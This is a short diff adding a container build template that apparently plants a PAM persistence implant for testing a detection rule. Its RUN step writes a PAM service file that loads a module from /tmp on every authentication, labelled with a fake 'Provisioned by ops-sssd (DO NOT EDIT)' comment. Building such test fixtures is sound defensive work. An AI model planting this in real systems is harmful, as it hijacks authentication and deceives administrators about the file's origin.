@@ -1,0 +1,17 @@
+# Implant template: pam-module-in-tmp (L2, orphan)
+#
+# T1556.003 (Modify Authentication Process: Pluggable Authentication
+# Modules). Drops a PAM service file whose auth stack loads a module
+# from /tmp, so the attacker .so runs on every authentication. The pam
+# module fires interpreter_in_tmp on the /tmp module path, matching the
+# pam_module_in_tmp Q7 rule.
+#
+# Variables: ${pam_file}, ${pam_module}
+
+RUN mkdir -p /etc/pam.d && \
+    printf '%s\n' \
+        '# Provisioned by ops-sssd (DO NOT EDIT)' \
+        'auth optional ${pam_module}' \
+        > ${pam_file} && \
+    chown root:root ${pam_file} && \
+    chmod 0644 ${pam_file}
